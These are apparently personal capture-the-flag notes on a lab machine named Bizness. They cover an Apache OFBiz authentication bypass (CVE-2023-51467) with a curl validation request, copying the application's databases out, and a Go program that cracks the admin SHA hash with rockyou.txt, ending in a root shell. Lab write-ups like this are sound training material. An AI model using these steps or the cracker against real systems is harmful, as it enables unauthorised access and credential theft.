---
tags:
  - web
  - cve-2023-49070
  - cve-2023-51467
  - linux
  - rce
---

# 6 jan

## 23:09

On initial scan it looks like this service is running apache ofbiz. Found by
using `ffuf` to retrieve the `/control` page.

Apache ofbiz looks to be vulnerable for multiple CVE's disclosed recently,
namely:

- CVE-2023-49070
- CVE-2023-51467

A poc for the first CVE doesn't result in anything but a validation for the
second CVE is promising:

```bash
$ curl 'https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y' -k


PONG%
```

# 7 Jan

## 15:35

Another open port was found `40621`. It doens't really respond and nmap reports
it as `tcpwrapped`

## 16:45

Am stupid

Have been trying to setup a revshell to the wron IP for hours now wondering why
it didn't work. Using the POC I now have access to the user.

## 16:49

File path thingies:

- `/path/ofbiz` Contains the root of the application

## 17:22

Exfiltrated the `/path/ofbiz/runtime` folder containing some derby databases.
One of the databases contains an `admin:$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
login. Lets see if this is crackable

# 12 Jan

## 13:27

Researching a bit about how ofbiz encrypts there passwords i stumbled upon https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java

Especially the following function:

```java
    private static boolean doComparePosix(String crypted, String defaultCrypt, byte[] bytes) {
        int typeEnd = crypted.indexOf("$", 1);
        int saltEnd = crypted.indexOf("$", typeEnd + 1);
        String hashType = crypted.substring(1, typeEnd);
        String salt = crypted.substring(typeEnd + 1, saltEnd);
        String hashed = crypted.substring(saltEnd + 1);
        return hashed.equals(getCryptedBytes(hashType, salt, bytes));
    }
```

The passed bytes are the bytes of the raw password string. In short the format is as follows:

- `$SHA$` Defines the hash type (minus the `$$`)
- `$d$` Defines the used salt (minus the `$$`)
- The rest is the hash that is compared

## 13:53

Created a small GO program that follows this algo with the `rockyou.txt` leaked database

```go
package main

import (
	"bufio"
	"crypto/sha1"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
)

const FULL = "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
const HASH_TYPE = "SHA"
const SALT = "d"
const HASH = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I"

func main() {
	file, err := os.Open("/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt")
	if err != nil {
		panic(err)
	}

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		toCheck := scanner.Text()
		calculatedHash := getCryptedBytes(toCheck)
		if calculatedHash == HASH {
			// We found a match
			println(fmt.Sprintf("Match found: %s Hash: %s", toCheck, calculatedHash))
			return
		}
	}
}

func getCryptedBytes(pass string) string {
	hash := sha1.New()
	hash.Write([]byte(SALT))
	hash.Write([]byte(pass))

	encoded := base64.RawURLEncoding.EncodeToString(hash.Sum(nil))
	return strings.Replace(encoded, "+", ".", -1)
}
```

And we got a hit!! `Match found: monkeybizness Hash: uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

## 14:03

We couldn't login with `ssh root@bizness.htb` and also the admin panel didn't
show anything obvious. We could however use `su` to get an elevated prompt from
the initial foothold. One `cat /root.txt` later and we are done.

